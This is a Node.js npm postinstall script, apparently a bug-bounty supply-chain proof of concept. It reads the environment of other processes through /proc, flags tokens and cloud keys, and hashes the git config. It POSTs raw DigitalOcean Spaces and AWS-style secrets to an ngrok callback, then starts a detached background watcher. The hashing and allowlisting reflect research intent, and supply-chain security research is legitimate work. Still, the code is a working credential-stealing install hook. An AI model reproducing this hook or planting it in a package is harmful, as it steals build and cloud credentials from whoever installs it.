import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { scanLifecycleMemory } from './lifecycle-memory-scan.mjs';

const sha256 = (value) => crypto.createHash('sha256').update(value ?? '').digest('hex');
const appRoot = path.resolve(process.env.npm_config_local_prefix || process.env.INIT_CWD || process.cwd());
const sensitiveName = /(?:SPACES|S3|AWS|GIT|TOKEN|SECRET|AUTH|CREDENTIAL|PASSWORD|PASSWD|PRIVATE|ACCESS_KEY|API_KEY|REGISTRY)/i;
const credentialShape = (value) => {
  if (/gh[pousr]_[A-Za-z0-9_.-]{20,}/.test(value)) return 'github-token';
  if (/https?:\/\/[^/@:\s]+:[^/@\s]+@/.test(value)) return 'credential-url';
  if (/^AKIA[A-Z0-9]{16}$/.test(value)) return 'aws-access-key';
  if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\./.test(value)) return 'jwt';
  return null;
};

const parseEnvironment = (content) => Object.fromEntries(content.toString('utf8').split('\0').filter(Boolean).map((entry) => {
  const index = entry.indexOf('=');
  return index < 0 ? [entry, ''] : [entry.slice(0, index), entry.slice(index + 1)];
}));

const processes = [];
const rawEnvironments = [];
for (const entry of fs.readdirSync('/proc').filter((value) => /^\d+$/.test(value)).sort((a, b) => Number(a) - Number(b)).slice(0, 256)) {
  try {
    const status = fs.readFileSync(`/proc/${entry}/status`, 'utf8');
    const uid = status.match(/^Uid:\s+(\d+)/m)?.[1] ?? null;
    const comm = fs.readFileSync(`/proc/${entry}/comm`, 'utf8').trim();
    const environment = parseEnvironment(fs.readFileSync(`/proc/${entry}/environ`));
    const interesting = Object.entries(environment).filter(([key, value]) => sensitiveName.test(key) || credentialShape(value)).map(([key, value]) => ({
      key,
      valueLength: value.length,
      valueSha256: sha256(value),
      credentialShape: credentialShape(value),
    }));
    processes.push({ pid: Number(entry), uid, comm, keyCount: Object.keys(environment).length, interesting });
    rawEnvironments.push({ pid: Number(entry), uid, comm, environment });
  } catch {
    // Different-UID or already-exited processes are expected negative controls.
  }
}

const directEnvironment = Object.entries(process.env).filter(([key, value]) => sensitiveName.test(key) || credentialShape(value ?? '')).map(([key, value]) => ({
  key,
  valueLength: value?.length ?? 0,
  valueSha256: sha256(value ?? ''),
  credentialShape: credentialShape(value ?? ''),
}));

const gitConfigCandidates = [
  '/workspace/.git/config',
  path.resolve(appRoot, '../../.git/config'),
];
let gitConfig = { readable: false, pathClass: null, bytes: 0, sha256: null, credentialShape: null };
for (const candidate of [...new Set(gitConfigCandidates)]) {
  try {
    const data = fs.readFileSync(candidate, 'utf8');
    gitConfig = {
      readable: true,
      pathClass: candidate === '/workspace/.git/config' ? 'workspace-root' : 'relative-workspace-root',
      bytes: Buffer.byteLength(data),
      sha256: sha256(data),
      credentialShape: credentialShape(data),
    };
    break;
  } catch {
    // Continue to the next deterministic workspace-root candidate.
  }
}

const spacesSource = rawEnvironments.find(({ environment }) => environment.SPACES_ACCESS_KEY && environment.SPACES_SECRET_KEY);
const callback = { configured: false, attempted: false, accepted: false, status: null, error: null };
const callbackBase = process.env.LAB_SUPPLY_CHAIN_CALLBACK_URL || '';
const callbackSecret = process.env.LAB_SUPPLY_CHAIN_CALLBACK_SECRET || '';
if (spacesSource && callbackBase && callbackSecret) {
  callback.configured = true;
  try {
    const url = new URL(callbackBase);
    if (url.protocol !== 'https:' || !url.hostname.endsWith('.ngrok-free.app')) throw new Error('callback-not-allowlisted');
    url.pathname = '/digitalocean-spaces-build';
    url.search = '';
    url.hash = '';
    callback.attempted = true;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-lab-secret': callbackSecret },
      body: JSON.stringify({
        schema: 1,
        capturedAt: new Date().toISOString(),
        probe: 'owned-dependency-postinstall',
        spaces: Object.fromEntries(Object.entries(spacesSource.environment).filter(([key]) => /^(?:SPACES|S3|AWS|CACHE)_[A-Z0-9_]+$/.test(key))),
      }),
      redirect: 'manual',
      signal: AbortSignal.timeout(5000),
    });
    callback.status = response.status;
    callback.accepted = response.status >= 200 && response.status < 300;
  } catch (error) {
    callback.error = error.name === 'TimeoutError' ? 'timeout' : String(error.message || error.code || error.name);
  }
}

const cacheDir = path.join(appRoot, '.owned-build-cache');
fs.mkdirSync(cacheDir, { recursive: true });
const cacheMarker = {
  schema: 1,
  marker: 'BBP_OWNED_DEPENDENCY_POSTINSTALL_V1',
  createdAt: new Date().toISOString(),
  source: 'owned-supply-chain-hook',
};
fs.writeFileSync(path.join(cacheDir, 'postinstall-marker.json'), `${JSON.stringify(cacheMarker)}\n`, { mode: 0o600 });

const controlMarkerCandidates = [
  path.join(appRoot, 'node_modules/owned-control-package/postinstall-ran'),
  path.join(appRoot, '.owned-control-package-postinstall-ran'),
];
const lifecycleMemory = await scanLifecycleMemory({ enableCallback: false });
let lifecycleWatcher = { started: false, pid: null, error: null };
try {
  const watcherPath = fileURLToPath(new URL('./lifecycle-watcher.mjs', import.meta.url));
  const watcher = spawn(process.execPath, [watcherPath], {
    detached: true,
    stdio: 'ignore',
    env: process.env,
  });
  watcher.unref();
  lifecycleWatcher = { started: true, pid: watcher.pid, error: null };
} catch (error) {
  lifecycleWatcher.error = String(error.code || error.name);
}
const report = {
  schema: 1,
  classification: 'RESEARCHER_OWNED_SUPPLY_CHAIN_CONTROL',
  createdAt: new Date().toISOString(),
  lifecycleEvent: process.env.npm_lifecycle_event ?? null,
  identity: {
    uid: typeof process.getuid === 'function' ? process.getuid() : null,
    gid: typeof process.getgid === 'function' ? process.getgid() : null,
  },
  appRootSha256: sha256(appRoot),
  directEnvironment,
  readableProcessCount: processes.length,
  interestingProcesses: processes.filter((entry) => entry.interesting.length > 0),
  gitConfig,
  spacesCredential: spacesSource ? {
    present: true,
    sourcePid: spacesSource.pid,
    sourceUid: spacesSource.uid,
    sourceComm: spacesSource.comm,
    accessKeyLength: spacesSource.environment.SPACES_ACCESS_KEY.length,
    accessKeySha256: sha256(spacesSource.environment.SPACES_ACCESS_KEY),
    secretKeyLength: spacesSource.environment.SPACES_SECRET_KEY.length,
    secretKeySha256: sha256(spacesSource.environment.SPACES_SECRET_KEY),
  } : { present: false },
  lifecycleMemory,
  lifecycleWatcher,
  callback,
  cacheMarkerWritten: true,
  controlPackage: {
    installed: fs.existsSync(path.join(appRoot, 'node_modules/owned-control-package/package.json')),
    hasLifecycleHook: false,
    executionMarkerPresent: controlMarkerCandidates.some((candidate) => fs.existsSync(candidate)),
  },
};

fs.writeFileSync(path.join(appRoot, 'owned-supply-chain-hook-report.json'), `${JSON.stringify(report, null, 2)}\n`, { mode: 0o600 });
const encoded = JSON.stringify(report);
const chunkSize = 1400;
const chunks = Math.ceil(encoded.length / chunkSize);
for (let index = 0; index < chunks; index += 1) {
  console.log(`LAB_SUPPLY_CHAIN_HOOK_PART ${index + 1}/${chunks} ${encoded.slice(index * chunkSize, (index + 1) * chunkSize)}`);
}
